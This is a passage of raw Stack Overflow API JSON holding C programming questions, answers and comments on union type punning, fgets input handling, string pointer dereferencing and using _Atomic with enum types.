pointer or lvalue is an access to the parent is a Quality of Implementation issue; the Standard offers no guidance as to what should be expected from a \"good\" implementation.</p>\n\n<p>As for what clang and gcc allow, they seem to recognize that an access to <code>someUnion.someArray[i]</code> is an access to the union, but they do <em>not</em> recognize <code>*(someUnion.someArray+i)</code> likewise, even though the Standard defines the two constructs as equivalent.  Since the Standard doesn't <em>require</em> that implementations recognize either (nor even the obvious <code>someUnion.intMember</code>), the disparity does not make clang and gcc non-conforming.  Nonetheless, it should be noted that they are astonishingly blind when it comes to recognizing lvalues based on unions.</p>\n"}], "owner": {"reputation": 2823, "user_id": 6872717, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UCuzs.png?s=128&g=1", "display_name": "alx", "link": "https://stackoverflow.com/users/6872717/alx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 217, "favorite_count": 0, "accepted_answer_id": 55012635, "answer_count": 3, "score": 3, "last_activity_date": 1551825014, "creation_date": 1551816669, "last_edit_date": 1551824937, "question_id": 55010795, "link": "https://stackoverflow.com/questions/55010795/type-punning-between-integer-and-array-using-union", "title": "Type punning between integer and array using `union`?", "body": "<p>Is it legal to do a type-punning between an integer and an array of integers?</p>\n\n<p>Specific code:</p>\n\n<pre><code>#include &lt;nmmintrin.h&gt;\n#include &lt;stdint.h&gt;\n\nunion   Uint128 {\n    __uint128_t uu128;\n    uint64_t    uu64[2];\n};\n\nstatic inline   uint_fast8_t    popcnt_u128 (__uint128_t n)\n{\n    const union Uint128 n_u     = {.uu128 = n};\n    const uint_fast8_t  cnt_a   = _mm_popcnt_u64(n_u.uu64[0]);\n    const uint_fast8_t  cnt_b   = _mm_popcnt_u64(n_u.uu64[1]);\n    const uint_fast8_t  cnt     = cnt_a + cnt_b;\n\n    return  cnt;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "input", "fgets"], "comments": [{"owner": {"reputation": 23, "user_id": 11156037, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DcL8aDODbwA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdwmVbG2V_XS3ZFfV63mFv2T-9zQQ/mo/photo.jpg?sz=128", "display_name": "BlindRob", "link": "https://stackoverflow.com/users/11156037/blindrob"}, "edited": false, "score": 0, "creation_date": 1551817665, "post_id": 55010677, "comment_id": 96776829, "body": "Solution: after the scanf I added this code:  \tint garbagecollector;  \tdo  \t{ \t\tgarbagecollector = getchar(); \t} while (garbagecollector != EOF &amp;&amp; garbagecollector != &#39;\\n&#39;);"}, {"owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "edited": false, "score": 0, "creation_date": 1551821253, "post_id": 55010677, "comment_id": 96778466, "body": "Can you provide the full related code with main function?"}, {"owner": {"reputation": 23, "user_id": 11156037, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DcL8aDODbwA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdwmVbG2V_XS3ZFfV63mFv2T-9zQQ/mo/photo.jpg?sz=128", "display_name": "BlindRob", "link": "https://stackoverflow.com/users/11156037/blindrob"}, "reply_to_user": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "edited": false, "score": 0, "creation_date": 1551875171, "post_id": 55010677, "comment_id": 96799354, "body": "see the edit of my source code."}], "owner": {"reputation": 23, "user_id": 11156037, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DcL8aDODbwA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdwmVbG2V_XS3ZFfV63mFv2T-9zQQ/mo/photo.jpg?sz=128", "display_name": "BlindRob", "link": "https://stackoverflow.com/users/11156037/blindrob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 32, "favorite_count": 0, "closed_date": 1551816337, "answer_count": 0, "score": 0, "last_activity_date": 1551875153, "creation_date": 1551816243, "last_edit_date": 1551875153, "question_id": 55010677, "link": "https://stackoverflow.com/questions/55010677/string-cannot-be-stored-in-variable-using-fgets-in-c", "closed_reason": "Duplicate", "title": "String cannot be stored in Variable using fgets in C", "body": "<p>I want to scan a String using the \"stdin\" but my code always runs over the fgets function and ends the program with code 0.\nI use this codesample: </p>\n\n<pre><code>int languageNumber = NULL;\nint randomNumber = NULL;\nint loopNumber = 1;\nchar loopChar = \"\";\nchar germanArray[MAX_VOCABLES][MAX_VOCABLE_STRING_LENGTH] = { \"Durchfall\", \"Pilz\" , \"Effizienz\", \"vegetarisch\", \"objektorientiert\"};\nchar englischArray[MAX_VOCABLES][MAX_VOCABLE_STRING_LENGTH] = { \"diarrhea\", \"fungus\", \"efficiency\", \"vegetarian\", \"object-orientated\"};\nchar inputString[MAX_VOCABLE_STRING_LENGTH] =\"\"; //leeren String initialisieren\n\nprintf(\"In welche Richtung willst du die Vokabeln trainieren? \\n\");\nprintf(\"1 = Deutsch-Englisch, 2 Englisch-Deutsch und 3 beendet das Programm. \\n\");\nscanf(\"%d\", &amp;languageNumber);\nprintf(\"\\n\");\n\nswitch (languageNumber)\n{\ncase 1: \n    while (loopNumber == 1)\n    {\n        randomNumber = randomize();\n        printf(\"Bitte dieses Wort in Englisch %cbersetzten: %s \\n\", ue, germanArray[randomNumber]);\n        printf(\"Wie lautet die %cbersetztung: \", UE);\n        fflush(stdin);\n        collectGarbage(); //siehe in der Implementierung der Funktion wieso dieser Aufruf passiert.\n        fgets(inputString, sizeof(inputString), stdin);\n        validateVocables(englischArray[randomNumber], inputString,languageNumber);\n</code></pre>\n\n<p>.......</p>\n\n<pre><code>    void collectGarbage()\n{\n    int garbagecollector; \n    {\n        garbagecollector = getchar();\n    } while (garbagecollector != EOF &amp;&amp; garbagecollector != '\\n');\n}\n</code></pre>\n\n<p>Regards Alex</p>\n"}, {"tags": ["c", "string", "pointers"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1551816062, "post_id": 55010606, "comment_id": 96776111, "body": "Because that is the ASCII value of the letter &#39;s&#39;"}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1551820399, "post_id": 55010606, "comment_id": 96778068, "body": "what output were you expecting?"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7659241, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5FeW.jpg?s=128&g=1", "display_name": "anand prakash", "link": "https://stackoverflow.com/users/7659241/anand-prakash"}, "edited": false, "score": 0, "creation_date": 1551816503, "post_id": 55010637, "comment_id": 96776297, "body": "what if i want to print the string. will %s will do?"}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "reply_to_user": {"reputation": 1, "user_id": 7659241, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5FeW.jpg?s=128&g=1", "display_name": "anand prakash", "link": "https://stackoverflow.com/users/7659241/anand-prakash"}, "edited": false, "score": 2, "creation_date": 1551816531, "post_id": 55010637, "comment_id": 96776310, "body": "@vasusingh <code>%s</code> along with <code>m</code> as the argument, not <code>*m</code>"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 6, "last_activity_date": 1551838898, "last_edit_date": 1551838898, "creation_date": 1551816102, "answer_id": 55010637, "question_id": 55010606, "link": "https://stackoverflow.com/questions/55010606/weird-beahaviour-of-string-pointers/55010637#55010637", "title": "Weird beahaviour of string pointers", "body": "<p><code>*m</code> is the same as <code>m[0]</code>, i.e. the first element of the array pointed to by <code>m</code> which is the character <code>'s'</code>.  </p>\n\n<p>By using the <code>%d</code> format specifier, you're printing the given argument as an integer.  The ASCII value of <code>'s'</code> is 115, which is why you get that value.</p>\n\n<p>If you want to print the string, use the <code>%s</code> format specifier (which expects a <code>char *</code> argument) instead and pass the pointer <code>m</code>.</p>\n\n<pre><code>printf(\"%s\\n\", m);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "edited": false, "score": 0, "creation_date": 1551838122, "post_id": 55014250, "comment_id": 96783297, "body": "I forgot to mention, when using printf, if you want to print an array of characters use %s as mentioned by other users, if you use printf %s the character array MUST be null terminated"}, {"owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551846029, "post_id": 55014250, "comment_id": 96785079, "body": "by pointing to a pointer you are actually derefrencing it, so *m[1]  would return the value of str[1], m[1] is going to return I believe part of the address, or garbage I&#39;m not sure which"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551846358, "post_id": 55014250, "comment_id": 96785147, "body": "No, <code>m</code> contains a pointer to the first element of <code>str</code>.  The syntax <code>m[1]</code> is exactly equivalent to <code>*(m+1)</code> as per section 6.5.2.1p2 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C standard</a>."}, {"owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551847075, "post_id": 55014250, "comment_id": 96785330, "body": "if it is exactly equivalent to *(m+1) then why are you considering it invalid instead of shorthand, 6.5.2.1p2 states that it is nothing more then a subscripted designation, meaning it&#39;s literally shorthand?"}, {"owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551847206, "post_id": 55014250, "comment_id": 96785366, "body": "In the example, I put both ways and even stated that they are the same..."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551847290, "post_id": 55014250, "comment_id": 96785383, "body": "<code>*(m+1)</code> is fine.   <code>*m[1]</code> is <b>not</b>.  It translates to <code>**(m + 1)</code>.  <code>m</code> is a <code>char *</code>, so <code>m + 1</code> is also a <code>char *</code>, making <code>*(m+1)</code> == <code>m[1]</code> a <code>char</code>, which makes <code>**(m+1)</code> == <code>*m[1]</code> invalid because you can&#39;t dereference a <code>char</code> as if it were a pointer."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551847502, "post_id": 55014250, "comment_id": 96785447, "body": "The code you posted fails to compile for exactly this reason."}, {"owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551847766, "post_id": 55014250, "comment_id": 96785508, "body": "by golly you&#39;re right. I&#39;ll have to read that document you posted and try to get a better under standing I suppose. I thought I had it pretty much down packed :/"}], "tags": [], "owner": {"reputation": 76, "user_id": 4225579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/997c35a967a53082163930da0c36e913?s=128&d=identicon&r=PG&f=1", "display_name": "TheStart101", "link": "https://stackoverflow.com/users/4225579/thestart101"}, "is_accepted": false, "score": 0, "last_activity_date": 1551836653, "creation_date": 1551836653, "answer_id": 55014250, "question_id": 55010606, "link": "https://stackoverflow.com/questions/55010606/weird-beahaviour-of-string-pointers/55014250#55014250", "title": "Weird beahaviour of string pointers", "body": "<p>You have a few problems here, \nthe first one is that you're trying to add three bytes to a char, a char is one byte.\nthe second problem is that char *m is a pointer to an address and is not a modifiable lvalue.  The only time you should use pointers is when you are trying to point to data</p>\n\n<p>example:</p>\n\n<pre><code>char byte = \"A\"; //WRONG\nchar byte = 0x61; //OK\nchar byte = 'A'; //OK\n//notice that when setting char byte = \"A\" you will recieve an error, \n//the double quotations is for character arrays where as single quotes,\n// are used to identify a char\nenter code here\nchar str[] = \"ABCDEF\";\nchar *m = str;\n\nprintf(\"%02x\", *m); //you are pointing to str[0]\nprintf(\"%02x\", *m[1]); //you are pointing to str[1]\nprintf(\"%02x\", *m[1]); //you are pointing to str[1]\nprintf(\"%02x\", *(m + 1)); //you are still pointing to str[1]\n//m is a pointer to the address in memory calling it like\n// *m[1] or *(m + 1) is saying address + one byte\n//these examples are the same as calling (more or less)\nprintf(\"%02x\", str[0]); or \nprintf(\"%02x\", str[1]); \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1603252838, "post_id": 64455705, "comment_id": 113975146, "body": "Arrays are not pointers.  Pointers are not arrays.  Rest of answer OK."}], "tags": [], "owner": {"reputation": 1, "user_id": 7659241, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5FeW.jpg?s=128&g=1", "display_name": "anand prakash", "link": "https://stackoverflow.com/users/7659241/anand-prakash"}, "is_accepted": false, "score": 0, "last_activity_date": 1603246684, "last_edit_date": 1603246684, "creation_date": 1603246299, "answer_id": 64455705, "question_id": 55010606, "link": "https://stackoverflow.com/questions/55010606/weird-beahaviour-of-string-pointers/64455705#64455705", "title": "Weird beahaviour of string pointers", "body": "<p>Pointers and arrays act similarly .Array names are also pointers pointing to the first element of the array.\nYou have stored &quot;srm&quot; as a character array with m pointing to the first element.\n&quot;%d&quot; will give you the ASCII value of the item being pointed by the pointer.\nASCII value of &quot;s&quot; is 115.\nif you increment your pointer (m++) then print it's ascii value , output will be ascii value of &quot;r&quot; - 114.</p>\n<pre><code>#include &lt;stdio.h&gt; \nint main()\n{ \n  char *m ;\n  m=&quot;srm&quot;; \n  m++;       //pointing to the 2nd element of the array\n  printf(&quot;%d&quot;,*m);   //output = 114\n  return 0; \n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7659241, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5FeW.jpg?s=128&g=1", "display_name": "anand prakash", "link": "https://stackoverflow.com/users/7659241/anand-prakash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "answer_count": 3, "score": -4, "last_activity_date": 1603246684, "creation_date": 1551815953, "last_edit_date": 1551833462, "question_id": 55010606, "link": "https://stackoverflow.com/questions/55010606/weird-beahaviour-of-string-pointers", "title": "Weird beahaviour of string pointers", "body": "<pre><code>#include &lt;stdio.h&gt; \nint main()\n{ \n  char*m ;\n  m=\"srm\";  \n  printf(\"%d\",*m); \n  return 0; \n}\n</code></pre>\n\n<p>The output is 115.  Can someone explain why it gives 115 as output?</p>\n"}, {"tags": ["c", "c11", "stdatomic"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1551816018, "post_id": 55010595, "comment_id": 96776095, "body": "According to <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.2.4p3\" rel=\"nofollow noreferrer\">port70.net/~nsz/c/c11/n1570.html#6.7.2.4p3</a> there is no prevention to use <code>_Atomic</code> with <code>enum</code>."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1551816842, "post_id": 55010595, "comment_id": 96776463, "body": "Side-note: If all you&#39;re doing is <code>atomic_store</code> and <code>atomic_load</code>, you can just declare <code>_Atomic(enum foo) foo_a;</code> and then use normal reads/assignment; IIRC, <code>_Atomic</code> qualified types perform sequentially consistent reads/writes (matching plain <code>atomic_load</code>/<code>atomic_store</code>, which are also sequentially consistent) automatically. If declared <code>_Atomic</code>, <code>foo = BAR;</code> and <code>enum foo val = foo;</code> will still be atomic operations. I&#39;m not 100% sure on this (inc/dec/compound assignment are all definitely sequentially consistent; it&#39;s possible less strict semantics are used for plain read/write)."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1551825553, "post_id": 55010595, "comment_id": 96780163, "body": "@ShadowRanger: AFAIK, you always need to use <code>atomic_store_explicit(..., memory_order_release)</code> any time you want ordering weaker than seq_cst.  There&#39;s no way to make <code>++</code> or <code>=</code> default to acq/rel or relaxed instead of seq_cst."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1551826731, "post_id": 55010595, "comment_id": 96780567, "body": "@PeterCordes: Yeah, that&#39;s what I thought. Didn&#39;t find that guarantee for plain loads and stores on first check, just for read-modify-write operations, but I wouldn&#39;t be surprised if they erred on the side of caution even for the simplest operations."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1551826841, "post_id": 55010595, "comment_id": 96780606, "body": "@ShadowRanger: It&#39;s possible that gcc / clang just chose that behaviour when they didn&#39;t have to; I didn&#39;t check the standard."}], "answers": [{"comments": [{"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1551817103, "post_id": 55010793, "comment_id": 96776570, "body": "At a guess on the second example, the machine they&#39;re compiling on doesn&#39;t put any special requirements on <code>_Atomic</code> types that the non-<code>_Atomic</code> type doesn&#39;t already satisfy (size is unchanged, alignment is already correct), and the compiler is just being lazy and ignoring the spec violation."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551866986, "post_id": 55010793, "comment_id": 96794353, "body": "It makes sense that parameters should be _Atomic, but in C17 7.17.7.1 it shows the format as <code>void atomic_store(volatile A *object, C desired);</code>. Why are these parameters not <code>_Atomic</code> qualified? Where exactly is the constraint violation you speak of?"}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551894041, "post_id": 55010793, "comment_id": 96810981, "body": "@Lundin AFAIR in this clause <code>A</code> always refers to an atomic type."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551943764, "post_id": 55010793, "comment_id": 96827709, "body": "Ok but I still don&#39;t get how it can be a constraint violation to pass <code>pointer-to-type</code> to a function expecting <code>qualified-pointer-to-type</code>. The <code>atomic_type</code> types don&#39;t seem to be distinct types, but typedefs of <code>_Atomic type</code>."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1551956470, "post_id": 55010793, "comment_id": 96835157, "body": "Because <code>_Atomic</code> only looks like a qualifier and isn&#39;t really one. The rule is <i>The phrase &quot;qualified or unqualified type&quot;, without specific mention of atomic, does not include the atomic types.</i> So pointers to types with and without atomic qualification are not compatible."}], "tags": [], "owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "is_accepted": true, "score": 3, "last_activity_date": 1551816658, "creation_date": 1551816658, "answer_id": 55010793, "question_id": 55010595, "link": "https://stackoverflow.com/questions/55010595/can-i-apply-the-c11-atomic-keyword-to-enum-types/55010793#55010793", "title": "Can I apply the C11 `_Atomic` keyword to enum types?", "body": "<p>Yes, all data types can be atomic, and there is no need to use the atomic generic functions for these. All operations with such an object is then atomic.</p>\n\n<p>For your second example it is weird that you compiler does not issue a warning. Using a non-atomic for an atomic operation is a constraint violation, so the compiler should give you a diagnostic. </p>\n"}, {"tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 3, "last_activity_date": 1551826298, "creation_date": 1551826298, "answer_id": 55012875, "question_id": 55010595, "link": "https://stackoverflow.com/questions/55010595/can-i-apply-the-c11-atomic-keyword-to-enum-types/55012875#55012875", "title": "Can I apply the C11 `_Atomic` keyword to enum types?", "body": "<p>Yes this is legal.  BTW, you don't actually need the parens, <code>_Atomic enum foo foo;</code> is equivalent.</p>\n\n<p><code>_Atomic</code> works like other type qualifiers, like <code>const</code> and <code>volatile</code>.</p>\n\n<hr>\n\n<pre><code>enum foo foo;\natomic_store(&amp;foo, BAR);\n</code></pre>\n\n<p><strong>is an error with clang</strong>.  <code>error: address argument to atomic operation must be a pointer to _Atomic type ('enum foo *' invalid)</code>.  (From <a href=\"https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(fontScale:1.2899450879999999,j:1,lang:c%2B%2B,source:&#39;%23include+%3Cstdatomic.h%3E%0A%23include+%3Cstdio.h%3E%0A%0Aenum+foo+%7B%0A++++FOO,%0A++++BAR,%0A++++BAZ,%0A%7D%3B%0A%0A%0Aint+main(void)+%7B%0A%0A++++//+_Atomic%0A++++enum+foo+foo%3B%0A++++atomic_store(%26foo,+BAR)%3B%0A%0A++++enum+foo+val+%3D+atomic_load(%26foo)%3B%0A%0A++++printf(%22%25u%5Cn%22,+val)%3B%0A%0A++++return+0%3B%0A%7D%0A&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:36.28485199150843,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:compiler,i:(compiler:g83,filters:(b:&#39;0&#39;,binary:&#39;1&#39;,commentOnly:&#39;0&#39;,demangle:&#39;0&#39;,directives:&#39;0&#39;,execute:&#39;1&#39;,intel:&#39;1&#39;,libraryCode:&#39;1&#39;,trim:&#39;1&#39;),fontScale:1.2899450879999999,lang:c%2B%2B,libs:!(),options:&#39;-xc+-O3+-Wall+-Wextra&#39;,source:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;x86-64+gcc+8.3+(Editor+%231,+Compiler+%231)+C%2B%2B&#39;,t:&#39;0&#39;)),k:31.978993011799986,l:&#39;4&#39;,m:100,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((g:!((h:compiler,i:(compiler:clang700,filters:(b:&#39;0&#39;,binary:&#39;1&#39;,commentOnly:&#39;0&#39;,demangle:&#39;0&#39;,directives:&#39;0&#39;,execute:&#39;1&#39;,intel:&#39;1&#39;,libraryCode:&#39;1&#39;,trim:&#39;1&#39;),fontScale:1.2899450879999999,lang:c%2B%2B,libs:!(),options:&#39;-xc+-O3+-Wall&#39;,source:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;x86-64+clang+7.0.0+(Editor+%231,+Compiler+%232)+C%2B%2B&#39;,t:&#39;0&#39;)),header:(),k:31.736154996691596,l:&#39;4&#39;,m:50,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:output,i:(compiler:2,editor:1,wrap:&#39;1&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%232+with+x86-64+clang+7.0.0&#39;,t:&#39;0&#39;)),header:(),l:&#39;4&#39;,m:50,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),k:31.736154996691596,l:&#39;3&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4\" rel=\"nofollow noreferrer\">the Godbolt compiler 